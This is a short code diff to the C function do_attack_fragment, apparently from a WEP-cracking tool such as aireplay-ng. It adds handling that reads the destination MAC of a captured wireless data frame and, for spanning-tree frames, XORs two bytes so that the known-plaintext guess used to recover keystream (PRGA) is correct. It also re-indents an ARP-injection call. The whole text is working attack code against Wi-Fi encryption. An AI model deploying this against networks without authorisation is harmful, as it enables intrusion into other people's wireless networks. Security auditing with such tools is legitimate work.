@@ -2674,6 +2674,7 @@ int do_attack_fragment()
     uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08";
     uchar iv[4];
     uchar ack[14] = "\xd4";
+    uchar dest[6];
 
     char strbuf[256];
 
@@ -2795,6 +2796,20 @@ int do_attack_fragment()
         caplen2 = caplen;
         printf("Data packet found!\n");
 
+        switch( packet2[1] & 3 )
+        {
+            case  0: memcpy( dest, packet2 +  4, 6 ); break;
+            case  1: memcpy( dest, packet2 + 16, 6 ); break;
+            case  2: memcpy( dest, packet2 +  4, 6 ); break;
+            default: memcpy( dest, packet2 + 16, 6 ); break;
+        }
+
+        if(memcmp( dest, SPANTREE, 6) == 0)
+        {
+            packet2[28] = ((packet2[28] ^ 0x42) ^ 0xAA);
+            packet2[29] = ((packet2[29] ^ 0x42) ^ 0xAA);
+        }
+
         prga_len = 7;
 
         again = RETRY;
@@ -2877,7 +2892,7 @@ int do_attack_fragment()
 
         if(again == NEW_IV) continue;
 
-            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
         if (caplen == 68)
         {
             //Thats the ARP packet!
